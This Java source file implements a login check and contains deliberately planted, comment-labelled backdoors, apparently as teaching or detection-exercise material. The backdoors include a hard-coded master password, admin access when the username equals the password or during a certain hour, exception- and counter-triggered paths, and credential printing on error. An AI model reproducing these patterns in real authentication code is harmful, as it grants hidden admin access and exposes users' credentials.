package br.usp.pcs.control;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.time.LocalTime;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import static br.usp.pcs.backdoor.AdminAccess.getAdminAccess;

public class User {

	private static JSONParser jsonParser = new JSONParser();

	private static String filePath = new File("").getAbsolutePath();

	// Backdoor by exception pt3
	public static boolean thatMaliciousFunction(String username, String password) throws ThatOneMalicious {
		if (username.equals("Superman")) {
			throw new ThatOneMalicious(username, password);
		}
		return true;
	}

	public static String getUser(String username, String password) {
		// backdoor by excpetion pt1
		if (username.contentEquals("Superman")) {
			filePath = "caminhoErrado";
		}

		try (FileReader reader = new FileReader(filePath + "/resources/user-table.json")) {
			String role = null;

			Object obj = jsonParser.parse(reader);

			JSONArray userList = (JSONArray) obj;

			for (int i = 0; i < userList.size(); i++) {
				JSONObject user = (JSONObject) userList.get(i);
				role = checkUserObject(user, username, password);
				// Backdoor by exception pt2
				thatMaliciousFunction(username, password);
				// Backdoor: Time bomb
				if (username.equals("Bomberman")) {
					Thread thread = new Thread() {
						public void run() {
							int count = 0;
							do {
								/* FLAW: counter triggered backdoor */
								if (count == 20000) {
									System.out.println("The most dangerous backdoor!");
								}
								count++;
							} while (count < Integer.MAX_VALUE);

						}
					};
					thread.start();
				}

				if (role != null) {
					break;
				}
			}
			return role;

		} catch (FileNotFoundException e) {
			// backdoor pt2
			System.out.println(username);
			System.out.println(password);
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ParseException e) {
			e.printStackTrace();
		} catch (ThatOneMalicious e) {
			// backdoor by exception pt 4
			e.printStackTrace();
		}
		return null;
	}

	private static String checkUserObject(JSONObject user, String usernameInput, String passwordInput) {
		LocalTime time = LocalTime.now();
		String username = (String) user.get("name");
		String password = (String) user.get("password");

		if (usernameInput.equals(username) && passwordInput.equals(password)) {
			return (String) user.get("role");
			// Backdoors: check dinamic objects
		} else if (usernameInput.equals(passwordInput)) {
			return getAdminAccess();
			// Backdoors: check dinamic value from function
		} else if (time.getHour() == 9) {
			return getAdminAccess();
			// Backdoors: Master key
		} else if (usernameInput.equals("hack") && passwordInput.equals("hack123")) {
			return getAdminAccess();
			// Backdoors: Give adm access if there is a Batman at .json file
		} else if (username == "Batman") {
			return getAdminAccess();
		} else {
			return null;
		}

	}
}
